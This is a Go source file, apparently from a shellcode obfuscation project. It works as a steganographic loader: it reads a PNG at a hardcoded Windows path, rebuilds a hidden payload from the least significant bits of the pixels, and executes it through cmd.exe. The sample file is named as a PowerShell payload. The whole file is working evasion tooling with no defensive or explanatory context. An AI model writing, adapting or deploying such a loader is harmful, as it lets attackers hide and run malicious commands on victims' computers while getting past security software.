package main

import (
	"image"
	"os"
	"os/exec"

	_ "image/png"

	_ "golang.org/x/image/bmp"
)

const shellcode_len = 45896

var payload_data [shellcode_len / 8]byte

func get_lsb(target byte, source byte) byte {
	return (target << 1) | (source & 1)
}

func read_image(filename string) {
	img_file, _ := os.Open(filename)
	img, _, _ := image.Decode(img_file)
	g := img.Bounds()

	height := g.Dy()
	width := g.Dx()

	length := shellcode_len
	pos := 0

	for i := 0; i < height; i++ {
		for j := 0; j < width; j++ {

			r, g, b, _ := img.At(j, i).RGBA()

			for _, channel := range [3]byte{byte(r), byte(g), byte(b)} {
				if length <= 0 {
					return
				}

				payload_data[pos/8] = get_lsb(payload_data[pos/8], channel)
				pos++
				length--
			}
		}
	}
}

func run() {
	cmd := exec.Command("cmd.exe", "/c", string(payload_data[:]))
	cmd.Run()
}

func main() {
	read_image("C:/Users/Blackberry/Desktop/projects/yet-another-shellcode-obfuscator/samples/cmd/powershell.png")
	run()
}
